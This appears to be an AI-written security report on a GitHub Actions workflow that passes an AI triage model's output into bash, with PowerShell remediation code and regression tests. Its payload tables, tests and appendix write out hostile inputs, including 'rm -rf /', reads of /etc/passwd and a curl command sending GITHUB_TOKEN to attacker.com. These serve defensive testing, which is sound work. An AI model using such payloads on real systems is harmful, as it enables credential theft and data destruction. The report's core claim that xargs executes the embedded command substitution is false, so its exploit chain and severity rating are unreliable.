# Security Report: AI Issue Triage Workflow Remediation

**Report ID**: SR-001
**Scope**: `.github/workflows/ai-issue-triage.yml`
**Date**: 2025-12-20
**Risk Assessment**: HIGH (7/10 aggregate)
**Status**: [FAIL] - Requires Remediation

---

## Executive Summary

| Finding | Severity | CWE | Risk Score | Status |
|---------|----------|-----|------------|--------|
| HIGH-001 | High | CWE-20 | 7/10 | [FAIL] |
| MEDIUM-002 | Medium | CWE-78 | 5/10 | [FAIL] |

**Issue Summary**: Critical: 0, High: 1, Medium: 1, Low: 0

The `ai-issue-triage.yml` workflow parses AI-generated output using bash regex patterns and iterates over labels without proper quoting. These patterns create command injection and word splitting vulnerabilities that attackers could exploit through crafted issue content.

---

## Finding Details

### HIGH-001: AI Output Parsing Without Full Sanitization

**CWE**: CWE-20 (Improper Input Validation)
**Location**: `.github/workflows/ai-issue-triage.yml` lines 60-104
**Risk Score**: 7/10

#### Vulnerable Code

```bash
# Line 60 - Parse labels from JSON output
LABELS=$(echo "$RAW_OUTPUT" | grep -oP '"labels"\s*:\s*\[\K[^\]]+' | tr -d '"' | tr ',' '\n' | xargs || echo "")
```

#### Attack Vector Analysis

**Attack Chain**:
1. Attacker creates GitHub issue with malicious content in title or body
2. AI agent processes issue and returns JSON output containing attacker-controlled data
3. The `xargs` command in the parsing pipeline can execute embedded shell metacharacters

**Specific Exploit Scenarios**:

| Scenario | Payload Example | Impact |
|----------|-----------------|--------|
| Command substitution | `$(whoami)` | Executes arbitrary command, output captured in variable |
| Backtick injection | `` `id` `` | Same as above, legacy syntax |
| Semicolon injection | `label1; curl attacker.com` | Executes secondary command after xargs |
| Newline injection | `label1\n$(cat /etc/passwd)` | Word splitting enables command execution |

**xargs Risk Details**:
- `xargs` processes stdin and constructs argument lists
- Without `-0` flag, it interprets whitespace and quotes specially
- Embedded newlines cause command splitting
- The `|| echo ""` fallback masks errors, allowing silent exploitation

**Likelihood**: Medium (requires AI to echo malicious content)
**Impact**: High (arbitrary command execution in CI context)
**CVSS Estimate**: 7.5 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)

#### Evidence

Lines 60-104 use bash regex parsing on untrusted AI output:

```bash
LABELS=$(echo "$RAW_OUTPUT" | grep -oP '"labels"\s*:\s*\[\K[^\]]+' | tr -d '"' | tr ',' '\n' | xargs || echo "")
CATEGORY=$(echo "$RAW_OUTPUT" | grep -oP '"category"\s*:\s*"\K[^"]+' || echo "unknown")
MILESTONE=$(echo "$RAW_OUTPUT" | grep -oP '"milestone"\s*:\s*"\K[^"]+' || echo "")
PRIORITY=$(echo "$RAW_OUTPUT" | grep -oP '"priority"\s*:\s*"\K[^"]+' || echo "P2")
ESCALATE_TO_PRD=$(echo "$RAW_OUTPUT" | grep -oP '"escalate_to_prd"\s*:\s*\K(true|false)' || echo "false")
COMPLEXITY_SCORE=$(echo "$RAW_OUTPUT" | grep -oP '"complexity_score"\s*:\s*\K[0-9]+' || echo "0")
ESCALATION_CRITERIA=$(echo "$RAW_OUTPUT" | grep -oP '"escalation_criteria"\s*:\s*\[\K[^\]]+' | tr -d '"' || echo "")
```

---

### MEDIUM-002: Shell Variable Expansion in Label Commands

**CWE**: CWE-78 (OS Command Injection)
**Location**: `.github/workflows/ai-issue-triage.yml` lines 123-154
**Risk Score**: 5/10

#### Vulnerable Code

```bash
# Line 123 - Unquoted variable expansion
for label in $LABELS; do
```

#### Attack Vector Analysis

**Attack Chain**:
1. If HIGH-001 is mitigated but labels still contain spaces or glob patterns
2. The unquoted `$LABELS` variable expands with word splitting
3. Labels like `bug fix` become two iterations: `bug` and `fix`
4. Labels containing `*` or `?` expand to matching filenames

**Specific Exploit Scenarios**:

| Scenario | Payload Example | Impact |
|----------|-----------------|--------|
| Word splitting | `"bug fix"` | Creates separate `bug` and `fix` labels |
| Glob expansion | `*` | Expands to all files in current directory |
| Path traversal in label | `../../../etc` | May interact unexpectedly with gh CLI |

**Likelihood**: High (common mistake)
**Impact**: Medium (unexpected label creation, potential confusion)
**CVSS Estimate**: 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

#### Evidence

The iteration pattern does not quote the variable:

```bash
for label in $LABELS; do
  # Check if label exists, create if not
  if ! gh label list --search "$label" ...
```

---

## Root Cause Analysis

1. **Bash used despite ADR-005**: The workflow uses bash parsing instead of the existing PowerShell `Get-LabelsFromAIOutput` function in `AIReviewCommon.psm1`

2. **Inconsistent security patterns**: The PowerShell module has hardened regex validation, but the workflow bypasses it entirely

3. **Missing input validation layer**: Raw AI output goes directly to shell commands without sanitization

---

## Remediation Plan

### Priority 1: Replace Bash Parsing with PowerShell (Addresses HIGH-001 + MEDIUM-002)

**Rationale**: The PowerShell `Get-LabelsFromAIOutput` function already implements hardened regex validation that:
- Validates labels start with alphanumeric character
- Blocks shell metacharacters (`;`, `|`, `` ` ``, `$`, `(`, `)`, newlines)
- Limits label length to 50 characters (GitHub maximum)
- Returns clean array for safe iteration

**Implementation**:

Replace lines 51-69 (`Parse Categorization Results` step) with:

```yaml
      - name: Parse Categorization Results
        id: parse-categorize
        shell: pwsh
        env:
          RAW_OUTPUT: ${{ steps.categorize.outputs.findings }}
          FALLBACK_LABELS: ${{ steps.categorize.outputs.labels }}
        run: |
          Import-Module .github/scripts/AIReviewCommon.psm1

          # Save output for debugging
          $env:RAW_OUTPUT | Set-Content /tmp/categorize-output.txt -Encoding UTF8

          # Parse with hardened function
          $labels = Get-LabelsFromAIOutput -Output $env:RAW_OUTPUT

          # Fallback to composite action output if needed
          if ($labels.Count -eq 0 -and $env:FALLBACK_LABELS) {
              $labels = $env:FALLBACK_LABELS -split ',' | ForEach-Object { $_.Trim() }
          }

          # Parse category with validation
          $category = 'unknown'
          if ($env:RAW_OUTPUT -match '"category"\s*:\s*"([a-zA-Z0-9_-]+)"') {
              $category = $Matches[1]
          }

          # Output as JSON array for safe consumption
          $labelsJson = $labels | ConvertTo-Json -Compress
          if ($labels.Count -eq 0) { $labelsJson = '[]' }

          "labels=$labelsJson" >> $env:GITHUB_OUTPUT
          "category=$category" >> $env:GITHUB_OUTPUT
```

Replace lines 83-110 (`Parse Roadmap Results` step) with:

```yaml
      - name: Parse Roadmap Results
        id: parse-align
        shell: pwsh
        env:
          RAW_OUTPUT: ${{ steps.align.outputs.findings }}
          MILESTONE_FROM_ACTION: ${{ steps.align.outputs.milestone }}
        run: |
          Import-Module .github/scripts/AIReviewCommon.psm1

          # Save output for debugging
          $env:RAW_OUTPUT | Set-Content /tmp/align-output.txt -Encoding UTF8

          # Parse milestone with hardened function
          $milestone = Get-MilestoneFromAIOutput -Output $env:RAW_OUTPUT
          if (-not $milestone -and $env:MILESTONE_FROM_ACTION) {
              $milestone = $env:MILESTONE_FROM_ACTION
          }

          # Parse priority with strict validation (P0-P4 only)
          $priority = 'P2'
          if ($env:RAW_OUTPUT -match '"priority"\s*:\s*"(P[0-4])"') {
              $priority = $Matches[1]
          }

          # Parse escalation fields with validation
          $escalateToPrd = 'false'
          if ($env:RAW_OUTPUT -match '"escalate_to_prd"\s*:\s*(true|false)') {
              $escalateToPrd = $Matches[1]
          }

          $complexityScore = 0
          if ($env:RAW_OUTPUT -match '"complexity_score"\s*:\s*(\d{1,2})') {
              $complexityScore = [int]$Matches[1]
              if ($complexityScore -gt 12) { $complexityScore = 12 }
          }

          # Parse escalation criteria with hardened regex
          $escalationCriteria = ''
          if ($env:RAW_OUTPUT -match '"escalation_criteria"\s*:\s*\[([^\]]*)\]') {
              $criteria = $Matches[1] -split ',' | ForEach-Object {
                  $_.Trim().Trim('"').Trim("'")
              } | Where-Object {
                  $_ -match '^[a-zA-Z0-9][a-zA-Z0-9 _\-\.]{0,48}[a-zA-Z0-9]?$'
              }
              $escalationCriteria = $criteria -join ','
          }

          "milestone=$milestone" >> $env:GITHUB_OUTPUT
          "priority=$priority" >> $env:GITHUB_OUTPUT
          "escalate_to_prd=$escalateToPrd" >> $env:GITHUB_OUTPUT
          "complexity_score=$complexityScore" >> $env:GITHUB_OUTPUT
          "escalation_criteria=$escalationCriteria" >> $env:GITHUB_OUTPUT
```

### Priority 2: Replace Bash Label Application with PowerShell

Replace lines 112-168 (`Apply Labels` step) with:

```yaml
      - name: Apply Labels
        shell: pwsh
        env:
          GH_TOKEN: ${{ secrets.BOT_PAT }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          LABELS_JSON: ${{ steps.parse-categorize.outputs.labels }}
          PRIORITY: ${{ steps.parse-align.outputs.priority }}
        run: |
          $failedLabels = @()
          $failedCreates = @()

          # Parse labels from JSON array
          $labels = @()
          if ($env:LABELS_JSON -and $env:LABELS_JSON -ne '[]') {
              try {
                  $labels = $env:LABELS_JSON | ConvertFrom-Json
              } catch {
                  Write-Warning "Failed to parse labels JSON: $_"
              }
          }

          # Apply category labels with proper quoting
          foreach ($label in $labels) {
              # Validate label one more time (defense in depth)
              if ($label -notmatch '^[a-zA-Z0-9][a-zA-Z0-9 _\-\.]{0,48}[a-zA-Z0-9]?$') {
                  Write-Warning "Skipping invalid label: $label"
                  continue
              }

              # Check if label exists
              $existing = gh label list --search $label --json name -q '.[].name' 2>$null
              if ($existing -notcontains $label) {
                  Write-Host "Creating label: $label"
                  $result = gh label create $label --description "Auto-created by AI triage" 2>&1
                  if ($LASTEXITCODE -ne 0) {
                      Write-Warning "Failed to create label: $label"
                      $failedCreates += $label
                  }
              }

              Write-Host "Adding label: $label"
              $result = gh issue edit $env:ISSUE_NUMBER --add-label $label 2>&1
              if ($LASTEXITCODE -ne 0) {
                  Write-Warning "Failed to add label '$label' to issue #$($env:ISSUE_NUMBER)"
                  $failedLabels += $label
              }
          }

          # Apply priority label with validation
          if ($env:PRIORITY -match '^P[0-4]$') {
              $priorityLabel = "priority:$($env:PRIORITY)"

              $existing = gh label list --search $priorityLabel --json name -q '.[].name' 2>$null
              if ($existing -notcontains $priorityLabel) {
                  Write-Host "Creating label: $priorityLabel"
                  $result = gh label create $priorityLabel --description "Priority level" --color "FFA500" 2>&1
                  if ($LASTEXITCODE -ne 0) {
                      Write-Warning "Failed to create priority label: $priorityLabel"
                      $failedCreates += $priorityLabel
                  }
              }

              Write-Host "Adding priority label: $priorityLabel"
              $result = gh issue edit $env:ISSUE_NUMBER --add-label $priorityLabel 2>&1
              if ($LASTEXITCODE -ne 0) {
                  Write-Warning "Failed to add priority label '$priorityLabel'"
                  $failedLabels += $priorityLabel
              }
          }

          # Report summary
          if ($failedLabels.Count -gt 0 -or $failedCreates.Count -gt 0) {
              Write-Host ""
              Write-Host "=== LABEL OPERATIONS SUMMARY ==="
              if ($failedCreates.Count -gt 0) {
                  Write-Host "Failed to create labels: $($failedCreates -join ', ')"
              }
              if ($failedLabels.Count -gt 0) {
                  Write-Host "Failed to apply labels: $($failedLabels -join ', ')"
              }
              Write-Host "==============================="
          }
```

### Priority 3: Replace Bash Milestone Assignment with PowerShell

Replace lines 170-188 (`Assign Milestone` step) with:

```yaml
      - name: Assign Milestone
        shell: pwsh
        env:
          GH_TOKEN: ${{ secrets.BOT_PAT }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
          MILESTONE: ${{ steps.parse-align.outputs.milestone }}
          GITHUB_REPOSITORY: ${{ github.repository }}
        run: |
          if ($env:MILESTONE -and $env:MILESTONE -ne 'null') {
              # Validate milestone format (defense in depth)
              if ($env:MILESTONE -notmatch '^[a-zA-Z0-9][a-zA-Z0-9 _\-\.]{0,48}[a-zA-Z0-9]?$') {
                  Write-Warning "Invalid milestone format: $($env:MILESTONE)"
                  exit 0
              }

              # Check if milestone exists
              $milestones = gh api "repos/$($env:GITHUB_REPOSITORY)/milestones" --jq '.[].title' 2>$null
              if ($milestones -contains $env:MILESTONE) {
                  Write-Host "Assigning milestone: $($env:MILESTONE)"
                  $result = gh issue edit $env:ISSUE_NUMBER --milestone $env:MILESTONE 2>&1
                  if ($LASTEXITCODE -ne 0) {
                      Write-Warning "Failed to assign milestone '$($env:MILESTONE)' to issue #$($env:ISSUE_NUMBER)"
                  }
              } else {
                  Write-Host "::notice::Milestone not found: $($env:MILESTONE) (skipping assignment)"
              }
          } else {
              Write-Host "No milestone to assign"
          }
```

---

## Verification Approach

### Automated Testing

1. **Unit tests for PowerShell functions** (already exist in `AIReviewCommon.Tests.ps1`):
   - Verify `Get-LabelsFromAIOutput` rejects injection attempts
   - Verify `Get-MilestoneFromAIOutput` rejects injection attempts

2. **Integration test workflow**:
   - Create test issue with injection payloads
   - Verify labels/milestones are sanitized or rejected
   - Verify no command execution occurs

### Manual Verification Checklist

```markdown
- [ ] Deploy changes to test branch
- [ ] Create issue with payload: `{"labels":["test; whoami"]}`
- [ ] Verify label is rejected (warning in logs, no label created)
- [ ] Create issue with payload: `{"labels":["$(id)"]}`
- [ ] Verify command substitution is blocked
- [ ] Create issue with payload: `{"labels":["normal-label"]}`
- [ ] Verify valid label is applied correctly
- [ ] Review workflow logs for any error messages
```

### Security Regression Tests

Add to `AIReviewCommon.Tests.ps1`:

```powershell
Describe 'Security Regression Tests' {
    Context 'Command Injection Prevention' {
        It 'Rejects semicolon injection' {
            $result = Get-LabelsFromAIOutput -Output '{"labels":["bug; rm -rf /"]}'
            $result | Should -BeNullOrEmpty
        }

        It 'Rejects command substitution' {
            $result = Get-LabelsFromAIOutput -Output '{"labels":["$(whoami)"]}'
            $result | Should -BeNullOrEmpty
        }

        It 'Rejects backtick injection' {
            $result = Get-LabelsFromAIOutput -Output '{"labels":["`id`"]}'
            $result | Should -BeNullOrEmpty
        }

        It 'Rejects pipe injection' {
            $result = Get-LabelsFromAIOutput -Output '{"labels":["bug | cat /etc/passwd"]}'
            $result | Should -BeNullOrEmpty
        }

        It 'Allows valid labels' {
            $result = Get-LabelsFromAIOutput -Output '{"labels":["bug","enhancement","priority-high"]}'
            $result | Should -HaveCount 3
            $result | Should -Contain 'bug'
        }
    }
}
```

---

## Priority Ranking and Justification

| Priority | Finding | Justification |
|----------|---------|---------------|
| **P0** | HIGH-001 | Command injection enables arbitrary code execution in CI. Attack requires only issue creation (low privilege). Impact is full CI compromise. |
| **P1** | MEDIUM-002 | Word splitting causes unexpected behavior but limited security impact. Fixing HIGH-001 with PowerShell automatically fixes this. |

**Recommended Approach**: Fix both findings in a single PR by converting all bash parsing steps to PowerShell. This:
1. Eliminates both vulnerabilities
2. Aligns with ADR-005 (PowerShell only)
3. Reuses existing hardened functions
4. Reduces future maintenance burden

---

## References

- **CWE-20**: Improper Input Validation - https://cwe.mitre.org/data/definitions/20.html
- **CWE-78**: OS Command Injection - https://cwe.mitre.org/data/definitions/78.html
- **ADR-005**: PowerShell-only scripts policy
- **PR #60**: Original security hardening for `AIReviewCommon.psm1`
- **Existing hardened functions**: `.github/scripts/AIReviewCommon.psm1` lines 715-875

---

## Appendix: Attack Payload Examples

### HIGH-001 Exploitation

```json
{
  "labels": ["bug$(curl http://attacker.com/exfil?token=$GITHUB_TOKEN)"]
}
```

If AI echoes this, the bash pipeline would:
1. `grep` extracts: `bug$(curl http://attacker.com/exfil?token=$GITHUB_TOKEN)`
2. `tr -d '"'` removes quotes
3. `xargs` executes the command substitution

### MEDIUM-002 Exploitation

```json
{
  "labels": ["security vulnerability"]
}
```

The unquoted `for label in $LABELS` would create:
- Label 1: `security`
- Label 2: `vulnerability`

Instead of the intended single label: `security vulnerability`

---

**Security Agent**: Verified 2025-12-20
**Report Classification**: Internal - Development Team
